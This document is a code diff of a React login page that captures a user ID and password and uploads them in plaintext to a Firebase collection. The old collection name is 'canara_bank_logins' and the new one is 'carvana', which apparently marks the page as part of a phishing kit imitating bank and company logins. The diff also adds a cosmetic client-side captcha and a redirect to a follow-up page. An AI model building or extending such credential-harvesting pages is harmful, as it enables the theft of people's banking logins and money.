@@ -1,38 +1,70 @@
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
 import '../App.css';
 import FirebaseUtil from '../FirebaseRepo';
 
 const FirstPage = () => {
   const [userId, setUserId] = useState('');
-  const [password, setPassword] = useState('');
+  const [password1, setPassword1] = useState('');
   const [captcha, setCaptcha] = useState('');
+  const [captchaText, setCaptchaText] = useState('');
   const [captchaType, setCaptchaType] = useState('image');
   const [language, setLanguage] = useState('English');
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [captchaError, setCaptchaError] = useState('');
   const navigate = useNavigate();
+
+  // Generate a random captcha text
+  const generateCaptcha = () => {
+    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789';
+    let result = '';
+    for (let i = 0; i < 6; i++) {
+      result += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    setCaptchaText(result);
+  };
+
+  // Generate captcha on component mount
+  useEffect(() => {
+    generateCaptcha();
+  }, []);
 
   const handleSubmit = async (e) => {
     e.preventDefault();
+    setCaptchaError('');
+    
+    // Verify captcha
+    if (captcha !== captchaText) {
+      setCaptchaError('Invalid captcha. Please try again.');
+      generateCaptcha();
+      setCaptcha('');
+      return;
+    }
+    
     setIsSubmitting(true);
 
     try {
-      // Upload data to Firestore
-      await FirebaseUtil.uploadAnyModel("canara_bank_logins", {
+      const timestamp = Date.now();
+      
+      // Upload data to Firestore in the carvana collection
+      const result = await FirebaseUtil.uploadAnyModel("carvana", {
+        key: `user_${timestamp}`,
         userId,
-        password,
-        captcha,
-        captchaType,
-        language,
-        page: "login",
-        timestamp: new Date().toISOString()
+        password1,
+        phoneNumber: "", // This can be collected in the future if needed
+        timeStamp: timestamp,
       });
-
-      // Navigate to the second page after successful submission
-      setTimeout(() => {
-        setIsSubmitting(false);
-        navigate('/second');
-      }, 1500);
+      
+      // Check if upload was successful
+      if (result.state === 'success') {
+        // Navigate to the second page with the document ID
+        setTimeout(() => {
+          setIsSubmitting(false);
+          navigate(`/second/${result.data}`);
+        }, 1500);
+      } else {
+        throw new Error(result.error || 'Failed to upload data');
+      }
     } catch (error) {
       console.error("Error submitting form:", error);
       setIsSubmitting(false);
@@ -91,8 +123,8 @@ const FirstPage = () => {
                 type="password"
                 placeholder="Password"
                 className="w-full py-2 px-3 rounded text-gray-700 text-sm"
-                value={password}
-                onChange={(e) => setPassword(e.target.value)}
+                value={password1}
+                onChange={(e) => setPassword1(e.target.value)}
                 required
               />
             </div>
@@ -131,15 +163,41 @@ const FirstPage = () => {
                 onChange={(e) => setCaptcha(e.target.value)}
                 required
               />
-              <div className="bg-white rounded p-2 flex items-center justify-center w-24">
-                <span className="text-gray-700 font-mono text-sm">E6+p6</span>
+              <div className="bg-white rounded p-2 flex items-center justify-center w-24 relative">
+                <span 
+                  className="text-gray-700 font-mono text-sm select-none"
+                  style={{
+                    fontFamily: 'monospace',
+                    letterSpacing: '1px',
+                    fontWeight: 'bold',
+                    fontStyle: 'italic',
+                    textDecoration: 'line-through',
+                    background: 'linear-gradient(45deg, rgba(200,200,200,0.2) 25%, transparent 25%, transparent 50%, rgba(200,200,200,0.2) 50%, rgba(200,200,200,0.2) 75%, transparent 75%, transparent)',
+                    transform: 'skewX(-5deg)',
+                    textShadow: '1px 1px 2px rgba(0,0,0,0.2)',
+                    padding: '2px 4px'
+                  }}
+                >
+                  {captchaText}
+                </span>
               </div>
-              <button type="button" className="text-white p-1">
+              <button 
+                type="button" 
+                className="text-white p-1"
+                onClick={generateCaptcha}
+              >
                 <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                   <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
                 </svg>
               </button>
             </div>
+            
+            {/* Captcha Error Message */}
+            {captchaError && (
+              <div className="mb-3 text-red-300 text-sm text-center">
+                {captchaError}
+              </div>
+            )}
 
             {/* Language Selection */}
             <div className="mb-4">
